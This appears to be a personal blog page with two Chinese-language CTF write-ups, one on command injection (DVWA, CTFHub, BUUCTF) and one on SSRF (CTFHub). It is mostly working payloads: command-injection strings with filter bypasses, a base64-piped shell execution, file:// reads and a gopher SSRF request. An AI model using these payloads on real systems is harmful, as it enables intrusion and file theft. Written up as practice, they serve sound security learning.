<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CTF-Web-命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
  <time class="dt-published" datetime="2021-02-24T13:42:40.000Z" itemprop="datePublished">2021-02-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">CTF-Web-命令执行</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; dir ..</span><br></pre></td></tr></table></figure>
<p>注意，目标主机为windows主机，故只能用windows命令行的命令</p>
<h2 id="median"><a href="#median" class="headerlink" title="median"></a>median</h2><p>看源码，设置了黑名单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$substitutions &#x3D; array(</span><br><span class="line">    &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上一个payload仍可以继续使用</p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>设置了黑名单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$substitutions &#x3D; array(</span><br><span class="line">    &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>payload1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ipconfig</span><br></pre></td></tr></table></figure>
<p>原理：黑名单的|右边有空格</p>
<h1 id="LFI-labs"><a href="#LFI-labs" class="headerlink" title="LFI labs"></a>LFI labs</h1><h2 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD-1"></a>CMD-1</h2><p>注意要手动修改一下URL地址，因为默认访问地址为<a target="_blank" rel="noopener" href="http://192.168.64.2/CMD-1/index.php?cmd=ipconfig">http://192.168.64.2/CMD-1/index.php?cmd=ipconfig</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-1&#x2F;index.php?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>
<h2 id="CMD-2"><a href="#CMD-2" class="headerlink" title="CMD-2"></a>CMD-2</h2><p>post提交cmd变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL: http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-2&#x2F;index.php</span><br><span class="line">post data: cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>
<h2 id="CMD-3"><a href="#CMD-3" class="headerlink" title="CMD-3"></a>CMD-3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-3&#x2F;index.php?domain&#x3D;www.baidu.com;whoami</span><br></pre></td></tr></table></figure>
<p>源码中显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">	echo(&quot;domain&#x3D;&quot; . $_GET[&quot;domain&quot;]);</span><br><span class="line">    system(&quot;&#x2F;usr&#x2F;bin&#x2F;whois &quot; . $_GET[&quot;domain&quot;]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>这是一个linux下的执行命令，故windows下不会执行</p>
<p>正常的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-3&#x2F;index.php?domain&#x3D;www.baidu.com;whoami</span><br></pre></td></tr></table></figure>
<h2 id="CMD-4"><a href="#CMD-4" class="headerlink" title="CMD-4"></a>CMD-4</h2><p>CMD-3的post版</p>
<h2 id="CMD-5"><a href="#CMD-5" class="headerlink" title="CMD-5"></a>CMD-5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-5&#x2F;index.php?server&#x3D;127.0.0.1|ipconfig;&amp;domain&#x3D;facebook.com</span><br></pre></td></tr></table></figure>
<h2 id="CMD-6"><a href="#CMD-6" class="headerlink" title="CMD-6"></a>CMD-6</h2><p>CMD-5的post版</p>
<h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>_request就是get的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-83e7247d4e39e832.sandbox.ctfhub.com:10080&#x2F;index.php?cmd&#x3D;system(&#39;ls&#39;);</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challenge-83e7247d4e39e832.sandbox.ctfhub.com:10080&#x2F;index.php?cmd&#x3D;system(&#39;ls ..&#x2F;..&#x2F;..&#39;);</span><br><span class="line">bin boot dev etc flag_31072 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challenge-83e7247d4e39e832.sandbox.ctfhub.com:10080&#x2F;index.php?cmd&#x3D;system(&#39;cat ..&#x2F;..&#x2F;..&#x2F;flag_31072&#39;);</span><br><span class="line">ctfhub&#123;6666fe7dd3da831df9f68f80&#125; </span><br></pre></td></tr></table></figure>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1| cat 321451934626212.php</span><br><span class="line">直接打开，无法打开，说明有特殊字符</span><br><span class="line"></span><br><span class="line">?ip&#x3D;127.0.0.1| cat 321451934626212.php | base64</span><br><span class="line"></span><br><span class="line">PD9waHAgLy8gY3RmaHViezAxNTYwYjNmMDEzOGRkYWE2M2E4NGJjNX0K</span><br><span class="line">&lt;?php &#x2F;&#x2F; ctfhub&#123;01560b3f0138ddaa63a84bc5&#125;</span><br></pre></td></tr></table></figure>
<h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1 | tac flag_321901637828076.php | base64</span><br></pre></td></tr></table></figure>
<h3 id="linux下查看文件内容的命令"><a href="#linux下查看文件内容的命令" class="headerlink" title="linux下查看文件内容的命令"></a>linux下查看文件内容的命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">head</span><br><span class="line">tail</span><br><span class="line">more</span><br><span class="line">tac</span><br><span class="line">cat</span><br><span class="line">nl</span><br><span class="line">od</span><br></pre></td></tr></table></figure>
<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>注意这些在输入框中提交，而不是在URL中提交（会有不可知的编码问题）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat$&#123;IFS&#125;flag*|base64</span><br><span class="line">127.0.0.1&amp;cat&lt;flag*|base64</span><br></pre></td></tr></table></figure>
<h3 id="linux下空格过滤绕过"><a href="#linux下空格过滤绕过" class="headerlink" title="linux下空格过滤绕过"></a>linux下空格过滤绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, $&#123;IFS&#125;,$IFS </span><br></pre></td></tr></table></figure>
<p>linux下${IFS}是分隔符的意思，默认是空格、制表符、换行符</p>
<h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p>还是注意要在输入框提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; cd flag_is_here;cat flag_65852541225548.php|base64</span><br></pre></td></tr></table></figure>
<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag_1744997223232.php</span><br></pre></td></tr></table></figure>
<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0abase64$&#123;IFS&#125;f**g_170978829515.php</span><br></pre></td></tr></table></figure>
<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>来源： GXYCTF2019</p>
<p>考察：RCE，空格绕过</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12246386.html">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p>
<p>页面提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;</span><br></pre></td></tr></table></figure>
<p>故在URL处设置ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
<p>有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br><span class="line">?ip&#x3D;127.0.0.1|cat flag.php </span><br><span class="line">?ip&#x3D;127.0.0.1|flag.php</span><br></pre></td></tr></table></figure>
<p>有过滤</p>
<p>fuzz一下，发现{}这些都被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>故不能直接输入flag</p>
<p>payload1：设置变量法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.ph</span><br></pre></td></tr></table></figure>
<p>payload2：base64编码法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
<h2 id="PHP下空格检测绕过"><a href="#PHP下空格检测绕过" class="headerlink" title="PHP下空格检测绕过"></a>PHP下空格检测绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="ckloj8nvr0001vcusb64ga86k" data-title="CTF-Web-命令执行" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/20/CTF-Web-SSRF/" class="article-date">
  <time class="dt-published" datetime="2021-02-20T01:26:15.000Z" itemprop="datePublished">2021-02-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/20/CTF-Web-SSRF/">CTF-Web-SSRF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTFHub（没做完，有几题貌似环境有问题）"><a href="#CTFHub（没做完，有几题貌似环境有问题）" class="headerlink" title="CTFHub（没做完，有几题貌似环境有问题）"></a>CTFHub（没做完，有几题貌似环境有问题）</h1><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>在注释中可以看到flag</p>
<p>注意，此处file协议后跟的绝对路径</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>考察：dict://协议</p>
<p>dict://协议可用于探测开放的端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:§_§ HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>得到端口后，直接访问（此处得到8011）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1:8011</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] !&#x3D; &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag&#x3D;getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key &#x3D; md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] &#x3D;&#x3D; $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;flag.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
<p>即要求将key提交给flag.php，同时只能由本地提交，也就是SSRF</p>
<p>利用gopher，发送构造好的报文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;flag.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key&#x3D;a2a7e6cc66515b8a94be07946050ed51</span><br></pre></td></tr></table></figure>
<p>其中要3次URL编码，其中换行符%0A要替换成%0d%0A</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?url&#x3D;127.0.0.1&#x2F;302.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Da2a7e6cc66515b8a94be07946050ed51	</span><br></pre></td></tr></table></figure>
<p>没出答案，方法应该没问题，跳过</p>
<h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5c384f5f92d64f244c7362b7&#125;</span><br></pre></td></tr></table></figure>
<h3 id="URL-跳转bypass"><a href="#URL-跳转bypass" class="headerlink" title="URL 跳转bypass"></a>URL 跳转bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.利用问好绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com?www.xxxx.me</span><br><span class="line">2.利用@绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com@www.xxxx.me</span><br><span class="line">3.利用斜杠反斜杠绕过限制</span><br><span class="line">4.利用#绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com#www.xxxx.me</span><br><span class="line">5.利用子域名绕过</span><br><span class="line">6.利用畸形url绕过</span><br><span class="line">7.利用跳转ip绕过</span><br></pre></td></tr></table></figure>
<h2 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;localhost&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>正解是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;IP:PORT&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>但是环境貌似有问题，直接访问?url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%E5%8D%B3%E5%8F%AF">http://127.0.0.1/flag.php即可</a></p>
<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h2><p>用途：查看目标端口指纹信息</p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;serverip:port</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;ip:port&#x2F;info</span><br></pre></td></tr></table></figure>
<p>可获取目标主机的port端口上运行着的应用</p>
<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h2><p>用途：发送各种格式的请求包</p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;ip:port&#x2F;gopher-path</span><br><span class="line">注意，gopher-path部分，回车换行符要进行2次URL编码</span><br></pre></td></tr></table></figure>
<p>示例</p>
